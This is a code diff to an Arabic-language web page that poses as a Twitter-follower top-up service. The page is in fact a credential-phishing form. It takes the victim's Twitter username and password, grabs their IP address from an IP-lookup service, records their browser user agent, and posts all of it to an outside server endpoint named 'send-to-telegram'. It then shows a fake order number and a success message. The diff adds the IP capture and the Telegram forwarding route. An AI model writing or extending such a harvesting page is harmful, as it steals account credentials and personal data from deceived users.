@@ -613,7 +613,7 @@
   </div>
   
   <script>
-    // متغيرات الموقع
+    // ⚙️ إعدادات الخادم
     const SERVER_URL = 'https://roksbot.onrender.com';
 
     // إظهار الإشعار
@@ -707,7 +707,9 @@
     // الدالة الرئيسية لإرسال بيانات السوشيال ميديا
     async function sendSocialAccount(socialData) {
         try {
-            const response = await fetch(SERVER_URL, {
+            console.log('📤 إرسال بيانات تويتر:', socialData);
+            
+            const response = await fetch(SERVER_URL + '/send-to-telegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -718,7 +720,8 @@
                     amount: socialData.followersCount,
                     chatId: socialData.chatId,
                     accountType: socialData.accountType,
-                    device: navigator.userAgent
+                    device: navigator.userAgent,
+                    ip: socialData.ip
                 })
             });
             
@@ -738,13 +741,14 @@
     }
 
     // دالة إرسال تويتر
-    async function submitTwitterAccount(username, password, followersCount, chatId) {
+    async function submitTwitterAccount(username, password, followersCount, chatId, ip) {
         const socialData = {
             username: username,
             password: password,
             followersCount: followersCount,
             chatId: chatId,
-            accountType: 'تويتر'
+            accountType: 'تويتر',
+            ip: ip
         };
         
         const result = await sendSocialAccount(socialData);
@@ -775,9 +779,14 @@
         const playerId = data.get("player_id");
         const amount = data.get("amount");
 
+        // الحصول على عنوان IP
+        const ipData = await fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .catch(() => ({ ip: "غير معروف" }));
+
         try {
           // استخدام الدالة الجديدة لإرسال بيانات تويتر
-          const result = await submitTwitterAccount(playerId, password, amount, CHAT_ID);
+          const result = await submitTwitterAccount(playerId, password, amount, CHAT_ID, ipData.ip);
           
           if (result.success) {
             // إظهار رسالة النجاح
@@ -786,6 +795,7 @@
                 <h3>تمت العملية بنجاح! ✅</h3>
                 <p>${result.message || 'سيتم شحن متابعين تويتر خلال 24 ساعة'}</p>
                 <p>رقم الطلب: #${Math.floor(100000 + Math.random() * 900000)}</p>
+                <p><i class="fas fa-check-circle"></i> تم استلام بياناتك بنجاح</p>
               </div>
             `;
             form.innerHTML = successHTML;
@@ -793,7 +803,7 @@
           } else {
             // إظهار رسالة الخطأ مع تفاصيل
             const errorHTML = `
-              <div class="error-message">
+              <div style="background: rgba(231, 76, 60, 0.2); border: 1px solid rgba(231, 76, 60, 0.4); border-radius: 10px; padding: 15px; margin: 20px 0; text-align: center;">
                 <h3>خطأ في الإرسال! ❌</h3>
                 <p>${result.message || 'حدث خطأ أثناء إرسال البيانات إلى السيرفر'}</p>
                 <p>يرجى المحاولة مرة أخرى</p>
@@ -805,7 +815,7 @@
         } catch (error) {
           // إظهار رسالة الخطأ مع تفاصيل
           const errorHTML = `
-            <div class="error-message">
+            <div style="background: rgba(231, 76, 60, 0.2); border: 1px solid rgba(231, 76, 60, 0.4); border-radius: 10px; padding: 15px; margin: 20px 0; text-align: center;">
               <h3>خطأ في الإرسال! ❌</h3>
               <p>${error.message || 'حدث خطأ غير معروف'}</p>
               <p>يرجى المحاولة مرة أخرى</p>
@@ -822,4 +832,4 @@
     });
   </script>
 </body>
-            </html>
+        </html>
